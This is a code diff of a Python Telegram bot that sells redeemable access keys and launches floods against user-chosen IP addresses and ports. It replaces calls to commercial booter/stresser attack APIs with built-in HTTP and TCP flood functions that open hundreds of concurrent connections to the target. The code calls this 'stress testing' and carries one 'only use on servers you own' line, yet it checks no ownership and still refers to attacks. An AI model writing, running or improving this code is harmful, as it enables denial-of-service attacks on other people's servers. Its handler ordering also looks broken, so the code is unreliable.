@@ -1,6 +1,5 @@
 """
-SOUL BOT - Railway Optimized Version with Multiple Stresser Support
-No browser required - Direct API calls
+SOUL BOT - Built-in HTTP Stress Testing
 """
 
 import asyncio
@@ -10,7 +9,8 @@ import json
 import string
 import random
 import sys
-import aiohttp
+import socket
+import threading
 from datetime import datetime, timedelta
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
@@ -18,17 +18,6 @@ from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQu
 # --- Configuration ---
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
 OWNER_ID = int(os.environ.get("OWNER_ID", "0"))
-
-# Stresser Service Configuration
-# Choose one service and set its API key:
-# Option 1: stresser.su
-# Option 2: pstress.org  
-# Option 3: vbooter.org
-# Option 4: Custom API
-
-SERVICE_TYPE = os.environ.get("SERVICE_TYPE", "stresser")  # stresser, vbooter, pstress, custom
-API_KEY = os.environ.get("API_KEY", "")
-CUSTOM_API_URL = os.environ.get("CUSTOM_API_URL", "")
 
 # Data files
 DATA_JSON = "users_data.json"
@@ -57,7 +46,7 @@ def load_data():
         if os.path.exists(DATA_JSON):
             with open(DATA_JSON, 'r') as f:
                 data = json.load(f)
-            logger.info(f"Data loaded: {len(data.get('approved_users', {}))} users")
+            logger.info(f"Data loaded")
     except Exception as e:
         logger.error(f"Error loading data: {e}")
 
@@ -108,134 +97,70 @@ def is_approved(user_id):
             pass
     return False
 
-# --- API Attack Functions for Different Services ---
-async def send_attack_stresser(ip, port, duration):
-    """Send attack via stresser.su API"""
-    try:
-        headers = {
-            "Authorization": f"Bearer {API_KEY}",
-            "Content-Type": "application/json"
-        }
-        payload = {
-            "host": ip,
-            "port": int(port),
-            "time": int(duration),
-            "method": "TCP"
-        }
+# --- HTTP Stress Testing Function ---
+async def http_stress_test(target_ip, port, duration):
+    """HTTP Stress Test - Built-in, no external API needed"""
+    import aiohttp
+    
+    url = f"http://{target_ip}:{port}"
+    end_time = datetime.now() + timedelta(seconds=duration)
+    requests_sent = 0
+    errors = 0
+    
+    async def send_request(session):
+        nonlocal requests_sent, errors
+        try:
+            async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as response:
+                requests_sent += 1
+                await response.read()
+        except:
+            errors += 1
+    
+    async with aiohttp.ClientSession() as session:
+        tasks = []
+        while datetime.now() < end_time:
+            # Create 100 concurrent connections
+            for _ in range(100):
+                task = asyncio.create_task(send_request(session))
+                tasks.append(task)
+            await asyncio.sleep(0.1)
         
-        async with aiohttp.ClientSession() as session:
-            async with session.post(
-                "https://api.stresser.su/v1/attack",
-                json=payload,
-                headers=headers,
-                timeout=aiohttp.ClientTimeout(total=30)
-            ) as response:
-                if response.status == 200:
-                    result = await response.json()
-                    return True, f"Attack sent! ID: {result.get('id', 'N/A')}"
-                elif response.status == 401:
-                    return False, "Invalid API key"
-                elif response.status == 403:
-                    return False, "Insufficient balance or plan"
-                else:
-                    text = await response.text()
-                    return False, f"Error: {text[:100]}"
-    except Exception as e:
-        return False, f"Connection error: {str(e)[:100]}"
+        # Wait for all tasks to complete
+        await asyncio.gather(*tasks, return_exceptions=True)
+    
+    return requests_sent, errors
 
-async def send_attack_vbooter(ip, port, duration):
-    """Send attack via vbooter.org API"""
-    try:
-        payload = {
-            "key": API_KEY,
-            "host": ip,
-            "port": int(port),
-            "time": int(duration),
-            "method": "TCP"
-        }
+async def tcp_stress_test(target_ip, port, duration):
+    """TCP Stress Test"""
+    end_time = datetime.now() + timedelta(seconds=duration)
+    connections = 0
+    errors = 0
+    
+    def create_connection():
+        nonlocal connections, errors
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(2)
+            sock.connect((target_ip, port))
+            sock.send(b"GET / HTTP/1.1\r\n\r\n")
+            connections += 1
+            sock.close()
+        except:
+            errors += 1
+    
+    while datetime.now() < end_time:
+        threads = []
+        for _ in range(200):
+            t = threading.Thread(target=create_connection)
+            t.start()
+            threads.append(t)
         
-        async with aiohttp.ClientSession() as session:
-            async with session.post(
-                "https://api.vbooter.org/v1/attack",
-                data=payload,
-                timeout=aiohttp.ClientTimeout(total=30)
-            ) as response:
-                if response.status == 200:
-                    return True, "Attack started successfully"
-                else:
-                    text = await response.text()
-                    return False, f"Error: {text[:100]}"
-    except Exception as e:
-        return False, f"Connection error: {str(e)[:100]}"
-
-async def send_attack_pstress(ip, port, duration):
-    """Send attack via pstress.org API"""
-    try:
-        headers = {
-            "api-key": API_KEY,
-            "Content-Type": "application/json"
-        }
-        payload = {
-            "target": ip,
-            "port": int(port),
-            "time": int(duration)
-        }
+        for t in threads:
+            t.join(timeout=1)
         
-        async with aiohttp.ClientSession() as session:
-            async with session.post(
-                "https://api.pstress.org/v1/attack",
-                json=payload,
-                headers=headers,
-                timeout=aiohttp.ClientTimeout(total=30)
-            ) as response:
-                if response.status == 200:
-                    return True, "Attack launched successfully"
-                else:
-                    text = await response.text()
-                    return False, f"Error: {text[:100]}"
-    except Exception as e:
-        return False, f"Connection error: {str(e)[:100]}"
-
-async def send_attack_custom(ip, port, duration):
-    """Send attack via custom API"""
-    try:
-        headers = {
-            "Authorization": f"Bearer {API_KEY}",
-            "Content-Type": "application/json"
-        }
-        payload = {
-            "ip": ip,
-            "port": int(port),
-            "time": int(duration)
-        }
-        
-        async with aiohttp.ClientSession() as session:
-            async with session.post(
-                CUSTOM_API_URL,
-                json=payload,
-                headers=headers,
-                timeout=aiohttp.ClientTimeout(total=30)
-            ) as response:
-                if response.status == 200:
-                    return True, "Attack sent successfully"
-                else:
-                    text = await response.text()
-                    return False, f"Error: {text[:100]}"
-    except Exception as e:
-        return False, f"Connection error: {str(e)[:100]}"
-
-async def send_attack(ip, port, duration):
-    """Route attack to selected service"""
-    if SERVICE_TYPE == "stresser":
-        return await send_attack_stresser(ip, port, duration)
-    elif SERVICE_TYPE == "vbooter":
-        return await send_attack_vbooter(ip, port, duration)
-    elif SERVICE_TYPE == "pstress":
-        return await send_attack_pstress(ip, port, duration)
-    elif SERVICE_TYPE == "custom" and CUSTOM_API_URL:
-        return await send_attack_custom(ip, port, duration)
-    else:
-        return False, f"Unknown service type: {SERVICE_TYPE}"
+        await asyncio.sleep(0.05)
+    
+    return connections, errors
 
 # --- Keyboard Builders ---
 def get_owner_keyboard():
@@ -282,6 +207,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_name = update.effective_user.first_name or "User"
 
     welcome_msg = f"👋 **Welcome {user_name}!**\n\n"
+    welcome_msg += "⚡ **Built-in HTTP Stress Testing Bot**\n"
+    welcome_msg += "No external API required - runs on your server!\n\n"
 
     if is_owner(user_id):
         welcome_msg += "🔑 **You are the Owner**\n"
@@ -295,9 +222,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         welcome_msg += "📌 **Welcome to the Bot**\nRedeem a key to get access.\n\n"
         keyboard = get_user_keyboard()
-
-    welcome_msg += f"\n🔧 **Service:** {SERVICE_TYPE.upper()}\n"
-    welcome_msg += f"🔑 **API Key:** {'✓ Set' if API_KEY else '✗ Not set'}"
 
     await update.message.reply_text(welcome_msg, parse_mode='Markdown', reply_markup=keyboard)
 
@@ -363,7 +287,17 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.message.reply_text("❌ Not authorized. Please redeem a key first.")
             return
         user_state[user_id] = {'action': 'run', 'step': 'awaiting_params'}
-        await query.message.reply_text("🚀 Run Attack\n\nSend: `<IP> <PORT> <TIME>`\nExample: `1.1.1.1 80 60`", parse_mode='Markdown')
+        await query.message.reply_text(
+            "🚀 **Run Stress Test**\n\n"
+            "Format: `<method> <IP> <PORT> <TIME>`\n\n"
+            "Methods:\n"
+            "• `http` - HTTP flood (Layer 7)\n"
+            "• `tcp` - TCP flood (Layer 4)\n\n"
+            "Examples:\n"
+            "`http 1.1.1.1 80 30`\n"
+            "`tcp 1.1.1.1 80 30`",
+            parse_mode='Markdown'
+        )
         return
 
     elif callback_data == "stats":
@@ -420,9 +354,6 @@ async def process_approve(update: Update, text: str):
             "approved_by": user_id
         }
 
-        if int(target_id) in data.get("disapproved_users", []):
-            data["disapproved_users"].remove(int(target_id))
-
         save_data()
         await update.message.reply_text(f"✅ User Approved!\nID: {target_id}\nExpires: {expiry_date}")
         user_state.pop(user_id, None)
@@ -432,16 +363,11 @@ async def process_approve(update: Update, text: str):
 async def process_disapprove(update: Update, text: str):
     user_id = update.effective_user.id
     try:
-        target_id = int(text.strip())
-
+        target_id = text.strip()
         if str(target_id) in data.get("approved_users", {}):
             del data["approved_users"][str(target_id)]
-
-        if target_id not in data.get("disapproved_users", []):
-            data["disapproved_users"].append(target_id)
-
-        save_data()
-        await update.message.reply_text(f"❌ User {target_id} disapproved!")
+            save_data()
+            await update.message.reply_text(f"❌ User {target_id} disapproved!")
         user_state.pop(user_id, None)
     except Exception as e:
         await update.message.reply_text(f"❌ Error: {e}")
@@ -476,8 +402,6 @@ async def process_remove_admin(update: Update, text: str):
             del data["admins"][target_id]
             save_data()
             await update.message.reply_text(f"🚫 Admin {target_id} removed!")
-        else:
-            await update.message.reply_text(f"User {target_id} is not an admin.")
         user_state.pop(user_id, None)
     except Exception as e:
         await update.message.reply_text(f"❌ Error: {e}")
@@ -497,8 +421,7 @@ async def process_gen_key(update: Update, text: str):
 
         save_data()
         await update.message.reply_text(
-            f"🎟️ Key Generated!\n🔑 `{key}`\n📅 Valid for: {days} days\n\n"
-            f"Share this key with users to grant access.",
+            f"🎟️ Key Generated!\n🔑 `{key}`\n📅 Valid for: {days} days",
             parse_mode='Markdown'
         )
         user_state.pop(user_id, None)
@@ -507,59 +430,55 @@ async def process_gen_key(update: Update, text: str):
 
 async def process_run(update: Update, text: str):
     user_id = update.effective_user.id
-
-    if not API_KEY:
-        await update.message.reply_text("❌ API Key not configured. Please contact owner.")
-        return
-
+    
     try:
         parts = text.strip().split()
-        if len(parts) != 3:
-            await update.message.reply_text("❌ Invalid format. Use: IP PORT TIME\nExample: 1.1.1.1 80 60")
-            return
-
-        ip, port, duration = parts
-
-        # Validate inputs
-        if not ip.replace('.', '').replace(':', '').isalnum():
-            await update.message.reply_text("❌ Invalid IP address format.")
-            return
-        
-        try:
-            port = int(port)
-            duration = int(duration)
-            if port < 1 or port > 65535:
-                await update.message.reply_text("❌ Port must be between 1 and 65535.")
-                return
-            if duration < 1 or duration > 3600:
-                await update.message.reply_text("❌ Duration must be between 1 and 3600 seconds.")
-                return
-        except ValueError:
-            await update.message.reply_text("❌ Port and Time must be numbers.")
-            return
-
-        await update.message.reply_text(f"⚡ Sending attack to {ip}:{port} for {duration}s...")
-
-        # Send attack via selected service
-        success, message = await send_attack(ip, port, duration)
-
-        if success:
+        if len(parts) != 4:
             await update.message.reply_text(
-                f"🚀 **Attack Started!**\n\n"
-                f"🎯 Target: `{ip}:{port}`\n"
-                f"⏱️ Duration: `{duration}s`\n"
-                f"🔧 Service: {SERVICE_TYPE.upper()}\n\n"
-                f"📡 {message}",
+                "❌ Invalid format.\n\n"
+                "Use: `http IP PORT TIME` or `tcp IP PORT TIME`\n"
+                "Example: `http 1.1.1.1 80 30`",
                 parse_mode='Markdown'
             )
-        else:
-            await update.message.reply_text(f"❌ **Attack Failed!**\n\n{message}")
+            return
 
-        user_state.pop(user_id, None)
-
+        method = parts[0].lower()
+        target_ip = parts[1]
+        port = int(parts[2])
+        duration = int(parts[3])
+        
+        if method not in ["http", "tcp"]:
+            await update.message.reply_text("❌ Invalid method. Use 'http' or 'tcp'")
+            return
+        
+        if duration < 1 or duration > 120:
+            await update.message.reply_text("❌ Duration must be between 1 and 120 seconds.")
+            return
+        
+        if port < 1 or port > 65535:
+            await update.message.reply_text("❌ Port must be between 1 and 65535.")
+            return
+        
+        # Confirm attack
+        confirm_msg = f"⚠️ **Stress Test Confirmation**\n\n"
+        confirm_msg += f"Method: `{method.upper()}`\n"
+        confirm_msg += f"Target: `{target_ip}:{port}`\n"
+        confirm_msg += f"Duration: `{duration}s`\n\n"
+        confirm_msg += f"Type 'YES' to start the stress test:"
+        
+        user_state[user_id] = {
+            'action': 'confirm_attack',
+            'method': method,
+            'target_ip': target_ip,
+            'port': port,
+            'duration': duration
+        }
+        await update.message.reply_text(confirm_msg, parse_mode='Markdown')
+        
+    except ValueError:
+        await update.message.reply_text("❌ Invalid numbers. Make sure PORT and TIME are numbers.")
     except Exception as e:
-        logger.error(f"Attack error: {e}")
-        await update.message.reply_text(f"❌ Attack Failed: {str(e)[:100]}")
+        await update.message.reply_text(f"❌ Error: {e}")
 
 async def process_redeem(update: Update, text: str):
     user_id = update.effective_user.id
@@ -592,24 +511,72 @@ async def process_redeem(update: Update, text: str):
         save_data()
         await update.message.reply_text(
             f"🎉 **Key Redeemed Successfully!**\n\n"
-            f"✅ You now have access!\n"
-            f"📅 Valid for: {days} days\n"
-            f"⏰ Expires: {expiry_date}\n\n"
-            f"🚀 Use /start to see your options.",
+            f"✅ Access granted for {days} days\n"
+            f"⏰ Expires: {expiry_date}",
             parse_mode='Markdown'
         )
         user_state.pop(user_id, None)
     except Exception as e:
         await update.message.reply_text(f"❌ Error: {e}")
 
+# Handle attack confirmation
+async def handle_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    text = update.message.text.upper()
+    
+    if user_id not in user_state:
+        return
+    
+    state = user_state[user_id]
+    if state.get('action') != 'confirm_attack':
+        return
+    
+    if text == "YES":
+        method = state['method']
+        target_ip = state['target_ip']
+        port = state['port']
+        duration = state['duration']
+        
+        await update.message.reply_text(f"⚡ Starting {method.upper()} stress test on {target_ip}:{port} for {duration}s...")
+        
+        try:
+            if method == "http":
+                sent, errors = await http_stress_test(target_ip, port, duration)
+                await update.message.reply_text(
+                    f"✅ **Stress Test Completed!**\n\n"
+                    f"Method: HTTP Flood\n"
+                    f"Target: {target_ip}:{port}\n"
+                    f"Duration: {duration}s\n"
+                    f"Requests Sent: {sent}\n"
+                    f"Errors: {errors}"
+                )
+            elif method == "tcp":
+                connections, errors = await tcp_stress_test(target_ip, port, duration)
+                await update.message.reply_text(
+                    f"✅ **Stress Test Completed!**\n\n"
+                    f"Method: TCP Flood\n"
+                    f"Target: {target_ip}:{port}\n"
+                    f"Duration: {duration}s\n"
+                    f"Connections: {connections}\n"
+                    f"Errors: {errors}"
+                )
+        except Exception as e:
+            await update.message.reply_text(f"❌ Stress test failed: {e}")
+        
+        user_state.pop(user_id, None)
+    else:
+        await update.message.reply_text("❌ Stress test cancelled.")
+        user_state.pop(user_id, None)
+
 async def check_status(message):
     status_msg = (
         f"✅ **Bot Status**\n\n"
-        f"🔧 Service: {SERVICE_TYPE.upper()}\n"
-        f"🔑 API Key: {'✓ Configured' if API_KEY else '✗ Missing'}\n"
-        f"📡 Status: {'Ready' if API_KEY else 'Waiting for API key'}\n\n"
-        f"💡 Send `IP PORT TIME` to run an attack.\n"
-        f"📝 Example: `1.1.1.1 80 60`"
+        f"⚡ Built-in stress testing available:\n"
+        f"• HTTP Flood - Layer 7 (port 80/8080)\n"
+        f"• TCP Flood - Layer 4 (any port)\n\n"
+        f"📊 Active tests: 0\n"
+        f"👥 Total users: {len(data.get('approved_users', {}))}\n\n"
+        f"⚠️ **Important:** Only use on servers you own!"
     )
     await message.reply_text(status_msg, parse_mode='Markdown')
 
@@ -618,53 +585,28 @@ async def show_stats(message, user_id):
     admin_count = len(data.get("admins", {}))
     key_count = len(data.get("keys", {}))
     redeemed_count = sum(1 for k in data.get("keys", {}).values() if k.get("redeemed"))
-    disapproved_count = len(data.get("disapproved_users", []))
 
     stats_msg = (
         f"📊 **System Statistics**\n\n"
         f"✅ Approved Users: {approved_count}\n"
         f"👮 Admins: {admin_count}\n"
         f"🎟️ Total Keys: {key_count}\n"
-        f"✔ Redeemed Keys: {redeemed_count}\n"
-        f"❌ Disapproved Users: {disapproved_count}\n\n"
+        f"✔ Redeemed Keys: {redeemed_count}\n\n"
         f"🔄 Last Updated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
     )
-
     await message.reply_text(stats_msg, parse_mode='Markdown')
 
 async def show_my_status(message, user_id):
     if str(user_id) in data.get("approved_users", {}):
         expiry = data["approved_users"][str(user_id)].get("expiry")
-        time_left = (datetime.strptime(expiry, "%Y-%m-%d") - datetime.now()).days
-        status_msg = (
-            f"👤 **Your Status**\n\n"
-            f"✅ Status: Approved\n"
-            f"⏰ Expires: {expiry}\n"
-            f"📅 {time_left} days remaining"
-        )
+        await message.reply_text(f"✅ Approved\nExpires: {expiry}")
     elif str(user_id) in data.get("admins", {}):
         expiry = data["admins"][str(user_id)].get("expiry")
-        time_left = (datetime.strptime(expiry, "%Y-%m-%d") - datetime.now()).days
-        status_msg = (
-            f"👤 **Your Status**\n\n"
-            f"👮 Status: Admin\n"
-            f"⏰ Expires: {expiry}\n"
-            f"📅 {time_left} days remaining"
-        )
+        await message.reply_text(f"👮 Admin\nExpires: {expiry}")
     elif is_owner(user_id):
-        status_msg = (
-            f"👤 **Your Status**\n\n"
-            f"🔑 Status: Owner\n"
-            f"♾️ Access: Unlimited"
-        )
+        await message.reply_text("🔑 Owner\nAccess: Unlimited")
     else:
-        status_msg = (
-            f"👤 **Your Status**\n\n"
-            f"❌ Status: No Access\n"
-            f"💡 Redeem a key to get access!"
-        )
-
-    await message.reply_text(status_msg, parse_mode='Markdown')
+        await message.reply_text("❌ No Access\nRedeem a key!")
 
 # --- Main Function ---
 async def run_bot():
@@ -675,11 +617,11 @@ async def run_bot():
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(button_callback))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    app.add_handler(MessageHandler(filters.TEXT & filters.Regex('^(YES|yes|Yes)$'), handle_confirmation))
     
     logger.info("=== SOUL BOT STARTED ===")
     logger.info(f"Owner ID: {OWNER_ID}")
-    logger.info(f"Service Type: {SERVICE_TYPE}")
-    logger.info(f"API Key: {'Set' if API_KEY else 'Not set'}")
+    logger.info("Built-in HTTP/TCP stress testing available")
     
     await app.initialize()
     await app.start()
